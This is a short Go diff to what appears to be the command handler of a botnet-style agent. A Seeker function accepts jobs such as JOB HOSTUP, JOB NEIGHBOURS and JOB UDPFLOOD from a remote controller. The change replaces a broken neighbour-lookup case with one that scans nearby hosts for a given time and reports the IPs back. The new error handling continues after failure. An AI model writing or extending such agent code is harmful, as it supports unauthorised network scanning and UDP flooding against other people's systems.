@@ -7,6 +7,7 @@ import (
 	"net"
 	"strconv"
 	"strings"
+	"time"
 
 	"github.com/Knetic/govaluate"
 
@@ -70,7 +71,7 @@ func Seeker() {
 				fallthrough
 			case "JOB HOSTUP":
 				fallthrough
-			case "JOB NEIGHBOURS 5":
+			case "JOB NEIGHBOURS":
 				fallthrough
 			case "JOB UDPFLOOD":
 				conn.Write([]byte(fmt.Sprint("ACPT JOB ", queryStr[4:], " \r\n")))
@@ -135,12 +136,13 @@ func Seeker() {
 					break
 				}
 				break
-			CASE "JOB NEIGHBOURS 5":
-				splits := strings.Split(cleanedResult[:15], cleanedResults[:2])
-				var addresses []map[string][]byte
-				addresses := jobs.neighbours(splits[1]);
-				conn.Write([]byte(fmt.Sprint(addresses, ", "))
-				
+			case "JOB NEIGHBOURS":
+				val, err := strconv.Atoi(data)
+				if err != nil {
+					conn.Write([]byte("JOB FAIL"))
+				}
+				ips, report := jobs.Neighbours(time.Duration(val) * time.Second)
+				conn.Write([]byte(fmt.Sprint(ips, "---", report)))
 				break
 			case "JOB UDPFLOOD":
 				// splits after JOB UDPFLOOD
